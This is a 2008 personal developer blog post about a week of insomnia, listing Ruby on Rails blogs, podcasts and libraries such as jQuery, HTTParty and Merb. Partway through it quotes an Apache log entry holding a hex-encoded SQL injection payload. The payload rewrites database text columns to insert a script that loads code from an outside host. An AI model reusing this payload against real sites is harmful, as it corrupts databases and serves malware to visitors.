# Week of Insomnia #

Contrary to what you might think, I think insomnia's fantastic.  It
puts me in this limbo state where my mind feels like lead and I suck
at _almost_ everything.  One thing I've found myself to be quite good
at is catching up on Internet.  There was plenty of crap, but I found
a lot of good technical stuff.

For starters, I subscribed to a bunch of new blogs:

* [Rails Garden](http://www.railsgarden.com) - he had a [fun
  entry](http://www.railsgarden.com/2008/04/01/ruby-on-rails-is-going-down-introducing-cobol-on-cogs/trackback/)
  on [Cobol On Cogs](http://www.coboloncogs.org/).  I love the
  functional function keys.
* [Jay Fields'
  Thoughts](http://blog.jayfields.com/2007/10/rails-rise-fall-and-potential-rebirth.html) - I
  forget where I initially heard about the Presenter pattern,
  but all the Ruby references to Presenter link to this guy.  Once
  you've read and understood the purpose of Presenter, then
  [ActivePresenter](http://jamesgolick.com/2008/7/28/introducing-activepresenter-the-presenter-library-you-already-know)
  is an implementation with a very clean declarative syntax.
* [Rails Envy](http://railsenvy.com/) - I knew of them before as
  the funny Ruby on Rails [commercials
  duo](http://railsenvy.com/tags/Commercials).  I noticed they had
  a podcast, so I started listening to that when I go running.
* [Stack Overflow](http://blog.stackoverflow.com/) - I also
  started listening to Stack Overflow.  It's not running music,
  but it's pretty darn entertaining.

I played with Google Analytics a bit, and noticed a fun bit in my
Apache access logs:

<pre style="width: 400px">
81.164.83.227 - - [17/Aug/2008:15:32:31 +0000] "GET
/?;DeCLARE%20@S%20CHAR(4000);SET%20@S=CAST(0x4445434C415245204054207661
726368617228323535292C40432076617263686172283430303029204445434C4152452
05461626C655F437572736F7220435552534F5220464F522073656C65637420612E6E61
6D652C622E6E616D652066726F6D207379736F626A6563747320612C737973636F6C756D
6E73206220776865726520612E69643D622E696420616E6420612E78747970653D27752
720616E642028622E78747970653D3939206F7220622E78747970653D3335206F7220622
E78747970653D323331206F7220622E78747970653D31363729204F50454E205461626C6
55F437572736F72204645544348204E4558542046524F4D20205461626C655F437572736
F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302
920424547494E20657865632827757064617465205B272B40542B275D20736574205B272B
40432B275D3D5B272B40432B275D2B2727223E3C2F7469746C653E3C7363726970742073
72633D22687474703A2F2F777777332E3830306D672E636E2F63737273732F772E6A73223
E3C2F7363726970743E3C212D2D272720776865726520272B40432B27206E6F74206C696B6
520272725223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F77777
7332E3830306D672E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D27
2727294645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2
040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F434
15445205461626C655F437572736F72%20AS%20CHAR(4000));ExEC(@S);
HTTP/1.1" 200 61318 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT
5.1; .NET CLR 1.1.4322)"
</pre>

I also had a blast playing with [jQuery](http://jquery.com/).  The
docs were clear and well organized.  All the selectors were exactly
what I wanted.  It was easy to chain together what I wanted to do
because of the methods return jQuery objects.  The callbacks were also
intuitive and easy to manipulate... even for a Javascript newbie.

Another library which I fell in love with at first site was
[HTTParty](http://railstips.org/2008/7/29/it-s-an-httparty-and-everyone-is-invited).
It really brings me back to my Perl screen scrapping days. (Oh!
WWW::Mechanize) It also linked me to the [Programmable
Web](http://www.programmableweb.com/apis/directory/) homepage.  I
didn't really read through what's available, but this is going to be a
great place to prototype mashups.

Seeing all this good stuff made me look for an excuse to write
something to solidify the basics in my head.  The result is a
half-assed mish-mash of Javascript and Ruby ala jQuery and Merb.  I
used Merb instead of Rails because I was too lazy to create a
database.  Surprisingly enough, [Passenger supports
Merb](http://www.modrails.com/documentation/Users%20guide%202.0.html#_merb)
just fine.  I looked at some of the other lighter Ruby web frameworks,
and they were all pretty fun.  I noted that the new
[Webgen](http://www.whatcodecraves.com/posts/2008/08/06/flaco_crusher/)
installed [Ramaze](http://ramaze.net/) as a dependency.  Check it out
if you're [feeling hyphy](http://hyphy.whatcodecraves.com/).

<object width="425" height="344"><param name="movie"
value="http://www.youtube.com/v/EEUyuKbSLK0&hl=en&fs=1"></param><param
name="allowFullScreen" value="true"></param><embed
src="http://www.youtube.com/v/EEUyuKbSLK0&hl=en&fs=1"
type="application/x-shockwave-flash" allowfullscreen="true"
width="425" height="344"></embed></object>

(Disclaimer: This is an inside joke that just won't die)

Speaking of Passenger, the new Railscast [episode about
Passenger](http://railscasts.com/episodes/122-passenger-in-development)
along with [nuby on rails'
article](http://nubyonrails.com/articles/ask-your-doctor-about-mod_rails)
about rstakeout might finally provide a solution to prevent me from
having to restart my server in development whenever I edit a plugin or
a file in the lib directory.  It also clued me into a whole world of
Ruby monitoring systems, the funniest named one being
[God](http://god.rubyforge.org/).

I worked a bunch on migrating this blog over to use Webgen.  I'd say
that I'm about 60 or 70 percent of the way there.  I spent most of the
time just reading and enjoying how simple and clear the code was.  I
think I have a good enough grip on enough code that I'd like to write
a few extensions so that I can continue to publish this blog without
any changes to the previous articles I wrote.

I think there was even more *stuff* I wanted to keep in my head.
Unforunately, a real downside of insomnia is having some, if not most,
of the good stuff leak out.
